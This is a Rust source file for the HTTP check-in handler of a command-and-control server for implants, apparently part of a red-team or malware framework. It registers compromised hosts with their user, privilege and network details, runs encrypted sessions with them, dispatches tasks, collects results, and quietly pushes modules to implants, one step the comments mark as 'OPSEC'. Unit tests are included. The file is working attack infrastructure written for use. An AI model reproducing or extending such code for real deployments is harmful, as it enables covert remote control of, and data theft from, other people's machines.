//! HTTP handler for implant check-ins
//!
//! POST /c  — single endpoint for all implant messages (registration and check-in).
//! The body is a serialised `MessageEnvelope` protobuf.

use std::sync::Arc;

use axum::{
    body::Bytes, extract::State, http::StatusCode, response::IntoResponse, routing::{get, post}, Router,
};
use prost::Message;

use common::{ImplantId, ImplantState, TaskId};
use crypto::types::{Nonce, X25519PublicKey};
use db::ImplantRecord;
use protocol::{
    implant_event::Event as EventVariant, task_response::Result as TaskResult, CheckIn,
    CheckInResponse, ImplantCheckedInEvent, ImplantEvent, ImplantRegisteredEvent,
    ImplantRegistration, MessageEnvelope, MessageType, RegistrationResponse, TaskError,
    TaskResultEvent, TaskStatus as ProtoTaskStatus, Timestamp,
};

use crate::state::ServerState;

/// Build the Axum router for the HTTP listener
pub fn build_router(state: Arc<ServerState>) -> Router {
    Router::new()
        .route("/c", post(handle_checkin))
        .route("/ws", get(crate::websocket::websocket_handler))
        .with_state(state)
}

/// Main implant handler — dispatches based on `MessageType`
async fn handle_checkin(State(state): State<Arc<ServerState>>, body: Bytes) -> impl IntoResponse {
    match process_envelope(&state, &body).await {
        Ok(response_bytes) => (StatusCode::OK, response_bytes).into_response(),
        Err(e) => {
            tracing::warn!(error = %e, "implant request error");
            (StatusCode::BAD_REQUEST, Vec::<u8>::new()).into_response()
        }
    }
}

async fn process_envelope(state: &ServerState, body: &[u8]) -> Result<Vec<u8>, String> {
    let envelope = MessageEnvelope::decode(body).map_err(|e| format!("envelope decode: {}", e))?;

    let msg_type = MessageType::try_from(envelope.message_type)
        .map_err(|_| "unknown message type".to_string())?;

    match msg_type {
        MessageType::Registration => handle_registration(state, &envelope.payload).await,
        MessageType::Checkin => handle_checkin_message(state, &envelope.payload).await,
        MessageType::Unspecified | MessageType::TaskResponse => {
            Err("unexpected message type in envelope".to_string())
        }
    }
}

async fn handle_registration(state: &ServerState, payload: &[u8]) -> Result<Vec<u8>, String> {
    let reg =
        ImplantRegistration::decode(payload).map_err(|e| format!("registration decode: {}", e))?;

    let sys = reg.system_info.as_ref();
    let hostname = sys.map(|s| s.hostname.clone()).filter(|s| !s.is_empty());
    let username = sys.map(|s| s.username.clone()).filter(|s| !s.is_empty());
    let domain = sys.map(|s| s.domain.clone()).filter(|s| !s.is_empty());
    let os_name = sys.map(|s| s.os_name.clone()).filter(|s| !s.is_empty());
    let os_version = sys.map(|s| s.os_version.clone()).filter(|s| !s.is_empty());
    let os_arch = sys.map(|s| s.os_arch.clone()).filter(|s| !s.is_empty());
    let process_id = sys.map(|s| s.process_id).filter(|&p| p > 0);
    let process_name = sys.map(|s| s.process_name.clone()).filter(|s| !s.is_empty());
    let process_path = sys.map(|s| s.process_path.clone()).filter(|s| !s.is_empty());
    let is_elevated = sys.map(|s| s.is_elevated).unwrap_or(false);
    let integrity_level = sys.map(|s| s.integrity_level.clone()).filter(|s| !s.is_empty());
    let local_ips = sys.map(|s| s.local_ips.clone()).unwrap_or_default();

    // Parse implant's ephemeral public key
    let implant_ephemeral_pub = if reg.ephemeral_public_key.len() == 32 {
        let mut bytes = [0u8; 32];
        bytes.copy_from_slice(&reg.ephemeral_public_key);
        X25519PublicKey(bytes)
    } else {
        return Err("invalid ephemeral public key length".to_string());
    };

    // Generate server ephemeral keypair for this session
    let (server_ephemeral_pub, server_ephemeral_priv) = state
        .crypto
        .generate_keypair()
        .map_err(|e| format!("keypair generation failed: {}", e))?;

    // Perform DH key exchange
    let shared_secret = state
        .crypto
        .key_exchange(&server_ephemeral_priv, &implant_ephemeral_pub)
        .map_err(|e| format!("key exchange failed: {}", e))?;

    // Derive session key
    let session_key = state
        .crypto
        .derive_session_key(&shared_secret)
        .map_err(|e| format!("session key derivation failed: {}", e))?;

    // Encrypt session key for storage
    let encrypted_session_key = state
        .crypto
        .encrypt_session_key(&session_key)
        .map_err(|e| format!("session key encryption failed: {}", e))?;

    let implant_id = ImplantId::new();
    let name = generate_water_name(&implant_id);
    let now = chrono::Utc::now().timestamp_millis();

    let record = ImplantRecord {
        id: implant_id,
        name: name.clone(),
        state: ImplantState::Active,
        hostname: hostname.clone(),
        username: username.clone(),
        domain,
        os_name: os_name.clone(),
        os_version,
        os_arch,
        process_id,
        process_name,
        process_path,
        is_elevated,
        integrity_level,
        local_ips,
        checkin_interval: 60,
        jitter_percent: 10,
        symmetric_key: Some(encrypted_session_key),
        nonce_counter: -1, // -1 = no nonce used yet, first check-in will use 0
        registered_at: now,
        last_seen: Some(now),
    };

    state
        .db
        .implants()
        .create(&record)
        .await
        .map_err(|e| format!("db create implant: {}", e))?;

    // Publish registered event
    state.publish_event(ImplantEvent {
        timestamp: Some(Timestamp::now()),
        event: Some(EventVariant::Registered(ImplantRegisteredEvent {
            implant_id: Some(implant_id.into()),
            name: name.clone(),
            hostname: hostname.clone().unwrap_or_default(),
            username: username.clone().unwrap_or_default(),
            os: os_name.clone().unwrap_or_default(),
        })),
    });

    // Webhook: ImplantRegistered
    state.notify_webhook(
        crate::webhook::WebhookEvent::ImplantRegistered,
        serde_json::json!({
            "implant_id": implant_id.to_string(),
            "name": name,
            "hostname": hostname.unwrap_or_default(),
            "username": username.unwrap_or_default(),
            "os": os_name.unwrap_or_default(),
        }),
    ).await;

    tracing::info!(implant_id = %implant_id, name = %name, "implant registered with session key");

    let response = RegistrationResponse {
        implant_id: Some(implant_id.into()),
        server_public_key: server_ephemeral_pub.as_bytes().to_vec(),
        assigned_name: name,
        checkin_interval: 60,
        jitter_percent: 10,
    };

    Ok(response.encode_to_vec())
}

async fn handle_checkin_message(state: &ServerState, payload: &[u8]) -> Result<Vec<u8>, String> {
    // Expected format: implant_id (16) + nonce (12) + ciphertext
    if payload.len() < 28 {
        return Err("payload too short for authenticated check-in".to_string());
    }

    // Extract implant ID from the first 16 bytes
    let implant_id =
        ImplantId::from_bytes(&payload[..16]).map_err(|e| format!("invalid implant_id: {}", e))?;

    // Fetch implant record to get session key
    let record = state
        .db
        .implants()
        .get(implant_id)
        .await
        .map_err(|e| format!("db get implant: {}", e))?
        .ok_or_else(|| format!("unknown implant {}", implant_id))?;

    // Get and decrypt the session key
    let encrypted_key = record.symmetric_key.ok_or("implant has no session key")?;
    let session_key = state
        .crypto
        .decrypt_session_key(&encrypted_key)
        .map_err(|e| format!("session key decryption failed: {}", e))?;

    // Extract nonce and ciphertext
    let nonce = Nonce::from_bytes(&payload[16..28]).map_err(|e| format!("invalid nonce: {}", e))?;
    let ciphertext = &payload[28..];

    // Verify nonce is greater than stored counter (prevent replay)
    // Compare as signed to handle initial -1 value correctly
    let received_counter = nonce.to_counter() as i64;
    if received_counter <= record.nonce_counter {
        return Err(format!(
            "nonce replay detected: received {} <= stored {}",
            received_counter, record.nonce_counter
        ));
    }

    // Decrypt and authenticate the check-in message
    let plaintext = crypto::aes_gcm::decrypt(
        &session_key,
        &nonce,
        ciphertext,
        implant_id.as_bytes(), // AAD = implant_id
    )
    .map_err(|e| format!("decryption/authentication failed: {}", e))?;

    // Update nonce counter to prevent replay
    state
        .db
        .implants()
        .update_nonce_counter(implant_id, received_counter)
        .await
        .map_err(|e| format!("nonce counter update failed: {}", e))?;

    // Parse the decrypted check-in
    let checkin =
        CheckIn::decode(plaintext.as_slice()).map_err(|e| format!("checkin decode: {}", e))?;

    // Update last_seen
    state
        .db
        .implants()
        .update_last_seen(implant_id)
        .await
        .map_err(|e| format!("db update last_seen: {}", e))?;

    // Process task responses
    for tr in &checkin.task_responses {
        if let Some(task_uuid) = &tr.task_id {
            if let Ok(task_id) = common::TaskId::from_bytes(&task_uuid.value) {
                let (status_str, result_data, error_msg) = match &tr.result {
                    Some(TaskResult::Success(s)) => {
                        ("completed", Some(s.result_data.as_slice()), None)
                    }
                    Some(TaskResult::Error(e)) => ("failed", None, Some(e.message.as_str())),
                    Some(TaskResult::Streaming(_)) | None => ("dispatched", None, None),
                };

                if let Err(e) = state
                    .db
                    .tasks()
                    .update_result(task_id, status_str, result_data, error_msg)
                    .await
                {
                    tracing::warn!(task_id = %task_id, error = %e, "failed to update task result");
                }

                // Update associated job if exists
                if status_str == "completed" || status_str == "failed" {
                    // Find job by task_id
                    if let Ok(jobs) = state.db.jobs().list_all(1000).await {
                        if let Some(job) = jobs.iter().find(|j| j.task_id == task_id.as_bytes().to_vec()) {
                            let now = chrono::Utc::now().timestamp_millis();
                            let job_status = if status_str == "completed" { "completed" } else { "failed" };

                            // Add output if available
                            if let Some(data) = result_data {
                                let _ = state.db.jobs().add_output(job.job_id, 0, data, true).await;
                            }

                            // Update job status
                            let _ = state.db.jobs().update_status(
                                job.job_id,
                                job_status,
                                100,
                                Some(now),
                                error_msg,
                            ).await;

                            tracing::info!(job_id = %job.job_id, task_id = %task_id, status = %job_status, "job completed");
                        }
                    }
                }

                // Publish task result event to broadcast channel
                let (proto_status, result_bytes, task_error) = match &tr.result {
                    Some(TaskResult::Success(s)) => (
                        ProtoTaskStatus::Completed as i32,
                        s.result_data.clone(),
                        None,
                    ),
                    Some(TaskResult::Error(e)) => (
                        ProtoTaskStatus::Failed as i32,
                        vec![],
                        Some(TaskError {
                            code: e.code,
                            message: e.message.clone(),
                            details: None,
                        }),
                    ),
                    Some(TaskResult::Streaming(_)) | None => {
                        (ProtoTaskStatus::Dispatched as i32, vec![], None)
                    }
                };
                state.publish_task_result(TaskResultEvent {
                    task_id: Some(task_uuid.clone()),
                    implant_id: Some(implant_id.into()),
                    status: proto_status,
                    result_data: result_bytes,
                    error: task_error,
                    completed_at: Some(Timestamp::now()),
                });

                // Webhook: TaskCompleted / TaskFailed
                let wh_event = match &tr.result {
                    Some(TaskResult::Success(_)) => Some(crate::webhook::WebhookEvent::TaskCompleted),
                    Some(TaskResult::Error(_)) => Some(crate::webhook::WebhookEvent::TaskFailed),
                    _ => None,
                };
                if let Some(wh_event) = wh_event {
                    let wh_data = serde_json::json!({
                        "task_id": task_id.to_string(),
                        "implant_id": implant_id.to_string(),
                        "status": status_str,
                        "error": error_msg,
                    });
                    state.notify_webhook(wh_event, wh_data).await;
                }
            }
        }
    }

    // Queue any missing required modules (OPSEC: one per check-in)
    // Derive platform from implant's OS info
    let platform = match (record.os_name.as_deref(), record.os_arch.as_deref()) {
        (Some(os), Some(arch)) => {
            let os_lower = os.to_lowercase();
            let arch_lower = arch.to_lowercase();
            if os_lower.contains("windows") {
                if arch_lower.contains("64") || arch_lower.contains("x86_64") || arch_lower.contains("amd64") {
                    "x86_64-windows"
                } else if arch_lower.contains("aarch64") || arch_lower.contains("arm64") {
                    "aarch64-windows"
                } else {
                    "x86_64-windows" // default
                }
            } else {
                // Linux/Unix
                if arch_lower.contains("64") || arch_lower.contains("x86_64") || arch_lower.contains("amd64") {
                    "x86_64-linux"
                } else if arch_lower.contains("aarch64") || arch_lower.contains("arm64") {
                    "aarch64-linux"
                } else {
                    "x86_64-linux" // default
                }
            }
        }
        _ => "x86_64-linux", // fallback
    };
    let _modules_queued = state
        .queue_missing_modules(implant_id, &checkin.loaded_modules, platform)
        .await;

    // Drain pending tasks for this implant
    let tasks = state.drain_tasks(implant_id);

    // Mark drained tasks as dispatched in the database
    if !tasks.is_empty() {
        let task_ids: Vec<TaskId> = tasks
            .iter()
            .filter_map(|t| {
                t.task_id
                    .as_ref()
                    .and_then(|uuid| TaskId::from_bytes(&uuid.value).ok())
            })
            .collect();
        if let Err(e) = state.db.tasks().mark_dispatched(&task_ids).await {
            tracing::warn!(error = %e, "failed to mark tasks as dispatched");
        }
    }

    // Publish checked-in event
    state.publish_event(ImplantEvent {
        timestamp: Some(Timestamp::now()),
        event: Some(EventVariant::CheckedIn(ImplantCheckedInEvent {
            implant_id: Some(implant_id.into()),
        })),
    });

    // Webhook: ImplantCheckin
    state.notify_webhook(
        crate::webhook::WebhookEvent::ImplantCheckin,
        serde_json::json!({
            "implant_id": implant_id.to_string(),
            "pending_tasks_delivered": tasks.len(),
        }),
    ).await;

    tracing::debug!(
        implant_id = %implant_id,
        pending_tasks = tasks.len(),
        "authenticated implant check-in"
    );

    // Config is now pushed via sleep task, not on every check-in
    let response = CheckInResponse {
        tasks,
        new_checkin_interval: None,
        new_jitter_percent: None,
        commands: vec![],
    };

    // Encrypt response with session key
    let response_bytes = response.encode_to_vec();
    let response_nonce = Nonce::random().map_err(|e| format!("nonce generation failed: {}", e))?;
    let encrypted_response = crypto::aes_gcm::encrypt(
        &session_key,
        &response_nonce,
        &response_bytes,
        b"", // No AAD for response
    )
    .map_err(|e| format!("response encryption failed: {}", e))?;

    // Return: nonce (12) + ciphertext
    let mut result = response_nonce.as_bytes().to_vec();
    result.extend(encrypted_response);
    Ok(result)
}

/// Generate a water-themed name from an implant's ID bytes
fn generate_water_name(id: &ImplantId) -> String {
    const ADJECTIVES: &[&str] = &[
        "azure", "cobalt", "crystal", "deep", "frozen", "glacial", "misty", "murky", "rapid",
        "silent", "still", "tidal",
    ];
    const NOUNS: &[&str] = &[
        "brook", "cascade", "current", "delta", "fjord", "geyser", "harbor", "lagoon", "rapids",
        "reef", "shoal", "spring", "stream", "tide", "torrent", "wave",
    ];

    let bytes = id.as_bytes();
    let adj = ADJECTIVES[(bytes[0] as usize) % ADJECTIVES.len()];
    let noun = NOUNS[(bytes[1] as usize) % NOUNS.len()];
    let suffix = u16::from_le_bytes([bytes[2], bytes[3]]);
    format!("{}-{}-{:04}", adj, noun, suffix)
}

#[cfg(test)]
mod tests {
    use super::*;
    use common::ImplantId;
    use prost::Message;

    // ------------------------------------------------------------------
    // generate_water_name
    // ------------------------------------------------------------------

    #[test]
    fn water_name_has_expected_format() {
        let id = ImplantId::new();
        let name = generate_water_name(&id);
        // Format: <adjective>-<noun>-<4-digit suffix>
        let parts: Vec<&str> = name.splitn(3, '-').collect();
        assert_eq!(parts.len(), 3, "name should have 3 dash-separated parts: {}", name);
        // Suffix is at least 4 decimal digits (u16 with :04 zero-padding, up to 5)
        assert!(parts[2].len() >= 4, "suffix should be at least 4 chars: {}", parts[2]);
        assert!(parts[2].len() <= 5, "suffix should be at most 5 chars (u16 max): {}", parts[2]);
        assert!(parts[2].chars().all(|c| c.is_ascii_digit()), "suffix should be digits: {}", parts[2]);
    }

    #[test]
    fn water_name_is_deterministic() {
        let id = ImplantId::new();
        assert_eq!(generate_water_name(&id), generate_water_name(&id));
    }

    #[test]
    fn water_name_differs_for_different_ids() {
        // Two random IDs should produce different names (astronomically likely)
        let a = generate_water_name(&ImplantId::new());
        let b = generate_water_name(&ImplantId::new());
        // This could theoretically collide but is effectively impossible in practice
        // We just verify both are non-empty valid strings
        assert!(!a.is_empty());
        assert!(!b.is_empty());
    }

    // ------------------------------------------------------------------
    // process_envelope — error paths (no DB needed for these)
    // ------------------------------------------------------------------

    #[tokio::test]
    async fn process_envelope_rejects_garbage_bytes() {
        let state = make_test_state().await;
        let result = process_envelope(&*state, b"not a protobuf at all \xff\xfe").await;
        assert!(result.is_err(), "garbage bytes should fail to decode");
        let msg = result.unwrap_err();
        assert!(msg.contains("envelope decode"), "error message: {}", msg);
    }

    #[tokio::test]
    async fn process_envelope_rejects_unknown_message_type() {
        let state = make_test_state().await;
        // Build an envelope with message_type = 99 (unknown)
        let env = protocol::MessageEnvelope {
            message_type: 99,
            payload: vec![],
        };
        let result = process_envelope(&*state, &env.encode_to_vec()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("unknown message type"));
    }

    #[tokio::test]
    async fn process_envelope_rejects_task_response_type() {
        let state = make_test_state().await;
        let env = protocol::MessageEnvelope {
            message_type: protocol::MessageType::TaskResponse as i32,
            payload: vec![],
        };
        let result = process_envelope(&*state, &env.encode_to_vec()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("unexpected message type"));
    }

    #[tokio::test]
    async fn process_envelope_rejects_unspecified_message_type() {
        let state = make_test_state().await;
        let env = protocol::MessageEnvelope {
            message_type: protocol::MessageType::Unspecified as i32,
            payload: vec![],
        };
        let result = process_envelope(&*state, &env.encode_to_vec()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("unexpected message type"));
    }

    #[tokio::test]
    async fn process_envelope_registration_rejects_bad_payload() {
        let state = make_test_state().await;
        // Valid envelope type but payload is garbage — registration decode should fail
        let env = protocol::MessageEnvelope {
            message_type: protocol::MessageType::Registration as i32,
            payload: vec![0xde, 0xad, 0xbe, 0xef],
        };
        // prost will accept partial decodes; pass truly bad data
        let result = process_envelope(&*state, &env.encode_to_vec()).await;
        // Either a decode error or a key-length error; either way it must be Err
        // (a 4-byte ephemeral key is not 32 bytes)
        assert!(result.is_err(), "bad registration payload should fail");
    }

    #[tokio::test]
    async fn process_envelope_checkin_rejects_too_short_payload() {
        let state = make_test_state().await;
        // Payload shorter than 28 bytes (16 id + 12 nonce minimum)
        let env = protocol::MessageEnvelope {
            message_type: protocol::MessageType::Checkin as i32,
            payload: vec![0u8; 10],
        };
        let result = process_envelope(&*state, &env.encode_to_vec()).await;
        assert!(result.is_err());
        assert!(
            result.unwrap_err().contains("payload too short"),
            "expected 'payload too short' error"
        );
    }

    // ------------------------------------------------------------------
    // Helper: build a minimal ServerState with in-memory DB
    // ------------------------------------------------------------------

    async fn make_test_state() -> std::sync::Arc<ServerState> {
        let db = db::Database::connect_memory().await.unwrap();
        db.migrate().await.unwrap();
        let master_key = crypto::SymmetricKey([0u8; 32]);
        let jwt = crate::auth::jwt::JwtManager::from_env_or_master_key(&master_key.0).unwrap();
        let crypto = crypto::ServerCrypto::new(master_key);
        let signing_key = module_store::ModuleSigner::generate_pkcs8().unwrap();
        let ms = std::sync::Arc::new(
            module_store::ModuleStore::new(std::sync::Arc::new(db.clone()), &signing_key).unwrap(),
        );
        let audit_key = b"test-audit-key-for-handler-test";
        crate::state::ServerState::new(db, crypto, ms, audit_key.to_vec(), jwt)
    }
}
